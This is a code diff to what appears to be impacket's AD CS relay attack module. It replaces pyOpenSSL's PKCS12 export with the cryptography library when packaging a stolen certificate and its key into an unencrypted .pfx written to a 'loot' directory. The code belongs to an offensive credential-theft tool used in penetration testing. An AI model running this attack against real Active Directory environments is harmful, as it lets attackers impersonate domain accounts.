@@ -20,6 +20,13 @@ import base64
 import os
 from OpenSSL import crypto
 
+from cryptography.hazmat.primitives.serialization import pkcs12
+from cryptography.hazmat.primitives.serialization import NoEncryption
+from cryptography.x509 import load_pem_x509_certificate, load_der_x509_certificate
+from cryptography.hazmat.backends import default_backend
+
+
+
 from impacket import LOG
 
 # cache already attacked clients
@@ -101,7 +108,7 @@ class ADCSAttack:
         LOG.info("GOT CERTIFICATE! ID %s" % certificate_id)
         certificate = response.read().decode()
 
-        certificate_store = self.generate_pfx(key, certificate)
+        certificate_store = self.generate_pfx(key.to_cryptography_key(), certificate)
         LOG.info("Writing PKCS#12 certificate to %s/%s.pfx" % (self.config.lootdir, self.username))
         try:
             if not os.path.isdir(self.config.lootdir):
@@ -133,13 +140,23 @@ class ADCSAttack:
         return crypto.dump_certificate_request(csr_type, req)
 
     @staticmethod
-    def generate_pfx(key, certificate, cert_type = crypto.FILETYPE_PEM):
-        certificate = crypto.load_certificate(cert_type, certificate)
-        p12 = crypto.PKCS12()
-        p12.set_certificate(certificate)
-        p12.set_privatekey(key)
-        return p12.export()
+    def generate_pfx(key, certificate, cert_type=crypto.FILETYPE_PEM):
 
+        if cert_type == crypto.FILETYPE_PEM:
+            cert=load_pem_x509_certificate(certificate.encode(), backend=default_backend())
+        else: #ASN1/DER
+            cert=load_der_x509_certificate(certificate.encode(), backend=default_backend())
+
+        pfx_data = pkcs12.serialize_key_and_certificates(
+            name=b"",
+            key=key,
+            cert=cert,
+            cas=None,
+            encryption_algorithm=NoEncryption()
+        )
+        
+        return pfx_data
+    
     @staticmethod
     def generate_certattributes(template, altName):
         if altName:
